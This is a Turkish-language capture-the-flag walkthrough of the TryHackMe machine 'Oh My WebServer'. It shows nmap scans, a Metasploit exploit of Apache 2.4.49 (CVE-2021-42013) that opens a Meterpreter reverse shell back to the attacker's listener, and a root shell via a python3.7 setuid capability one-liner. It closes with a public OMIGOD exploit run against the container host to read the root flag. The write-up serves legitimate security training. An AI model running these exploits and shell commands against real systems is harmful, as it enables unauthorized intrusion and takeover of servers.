# TryHackMe - Oh My WebServer

Merhabalar, bu yazımda sizlere tryhackme.com platformunda bulunan "Oh My WebServer" isimli makinenin çözümünü göstereceğim. İlk önce nmap aracını kullanarak makinede açık olan portları görüntüleyeceğim.

```markdown
> nmap -sVC --min-rate 1000 10.10.161.62

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-06 14:13 EDT
Nmap scan report for 10.10.161.62
Host is up (0.075s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
> 80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
> |_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
```

http methotlarından biri olan trace methodunun açık olduğunu ve bu methotun bir risk yarattığını belirtmiş ancak internette bunun bir önemli bir risk oluşturduğuna dair bir yazı göremedim. Bunun dışında apache httpd'nin 2.4.49 versiyonunu kullanıyormuş. Bu servisin 2.4.49 versiyonunda uzaktan kod yürütme zafiyeti bulunuyor.

```markdown
msf6 > search 2.4.49

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1    \_ target: Automatic (Dropper)              .                .          .      .
   2    \_ target: Unix Command (In-Memory)         .                .          .      .
   3  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
   4    \_ action: CHECK_RCE                        .                .          .      Check for RCE (if mod_cgi is enabled).
   5    \_ action: CHECK_TRAVERSAL                  .                .          .      Check for vulnerability.
   6    \_ action: READ_FILE                        .                .          .      Read file on the remote server.


Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/http/apache_normalize_path
After interacting with a module you can manually set a ACTION with set ACTION 'READ_FILE'
```

Exploiti seçtikten sonra options komutunu kullanarak vermemiz gereken bilgileri görüyoruz ve `set isim değer` şeklinde bilgileri ekliyoruz. Devamında da run veya exploit komutunu kullanarak exploiti çalıştırabiliriz.

```markdown
msf6 exploit(multi/http/apache_normalize_path_rce) > set rport 80
rport => 80
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 10.9.2.218:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://10.10.161.62:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://10.10.161.62:80 - Attempt to exploit for CVE-2021-42013
[*] http://10.10.161.62:80 - Sending linux/x64/meterpreter/reverse_tcp command payload
[*] Sending stage (3045380 bytes) to 10.10.161.62
[*] Meterpreter session 1 opened (10.9.2.218:4444 -> 10.10.161.62:53798) at 2024-06-06 14:24:20 -0400
[!] This exploit may require manual cleanup of '/tmp/uycb' on the target

meterpreter > pwd
/bin
```

Sisteme başarılı bir şekilde giriş yaptım ve home dizini altında kullanıcı bayrağını almaya gittim. Ancak dizinde herhangi bir kullanıcı dizini yoktu. user.txt görüntüleyebildiğimiz hiçbir dizinin içerisinde yer almıyordu. Bu yüzden metasploitte bulunan exploit suggester modülünü kullandım. Her ne kadar bir uygun bir exploit bulduğunu söylese de exploit'i hiçbir şekilde çalıştıramadım. Ancak bu sayede kenarda yazan makinenin local ip adresini fark edebildim. Bulunduğum makine 172.17.0.2 adresine sahip. Mantıken 172.17.0.1 şeklinde bir makine de vardır diye düşündüm. O makine ile de ilgileneceğim ama öncelikle bu makinede yetki yükseltmem gerekiyor, /root dizininin içerisinde önemli bir bilgi olabilir.

```markdown
> getcap -r /

...
/usr/bin/python3.7 = cap_setuid+ep
```

![1](https://github.com/ronark7/writeups/assets/165813191/a5c32be4-b477-4e27-9f69-50e635f14389)

```
daemon@4a70924bafa0:/$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
id
uid=0(root) gid=1(daemon) groups=1(daemon)
```

/root dizini altında user.txt dosyası bulunuyor, buradan kullanıcı bayrağını aldıktan sonra sistemde biraz daha vakit öldürdüm. Ancak diğer makine için daha fazla bilgi çıkaramadım. Bu durumda ilk başta yaptığımız gibi bir port taraması daha gerçekleştirip diğer makineyi tanımaya çalışmalıyız. Metasploit'in içerisinde local ağda port taraması yapabilmek için bir modül bulunmuyor. Bu yüzden port taramasını yapabilmek için nmap'in ikili dosyasını indirip çalıştıracağım.

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

```markdown
./nmap 172.17.0.1 -p- --min-rate 10000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-06 19:14 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000029s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:B0:6A:65:D0 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 20.16 seconds
```

Taramada nedense versiyon taraması gerçekleştiremiyorum. Her neyse bu çokta önemli değil 5986 numaralı porta uygun bir exploit buldum ve sisteme yükledim daha sonra ise bu exploitten faydalanarak karşı makineden root.txt dosyasını aldım.

https://github.com/CyberMonitor/CVE-2021-38648/blob/main/CVE-2021-38647.py

```markdown
# /usr/bin/python3.7 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
/usr/bin/python3.7 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
THM{************************}
```
